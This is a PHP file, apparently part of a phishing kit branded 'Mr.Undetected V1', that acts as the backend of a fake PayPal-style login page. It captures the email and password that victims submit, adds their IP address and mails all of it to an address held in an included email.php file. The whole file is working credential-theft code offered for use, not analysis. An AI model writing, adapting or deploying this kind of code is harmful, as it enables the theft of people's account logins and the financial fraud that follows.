<?php
//#     #            #     #                                                              #     #   #   
//##   ## #####      #     # #    # #####  ###### ##### ######  ####  ##### ###### #####  #     #  ##   
//# # # # #    #     #     # ##   # #    # #        #   #      #    #   #   #      #    # #     # # #   
//#  #  # #    #     #     # # #  # #    # #####    #   #####  #        #   #####  #    # #     #   #   
//#     # #####  ### #     # #  # # #    # #        #   #      #        #   #      #    #  #   #    #   
//#     # #   #  ### #     # #   ## #    # #        #   #      #    #   #   #      #    #   # #     #   
//#     # #    # ###  #####  #    # #####  ######   #   ######  ####    #   ###### #####     #    ##### 

include 'function.php';
include '../../email.php';
include("system.php");

$_SESSION['PPL_ID']=$_POST['login_email'];
$_SESSION['Password']=$_POST['login_password'];

$ip=$_SESSION['ip']=getip();
$subject=$_SESSION['subject']=" PPL Login | ".$ip."" . "\r\n";
send($_SESSION,$to,$subject) ; 

?>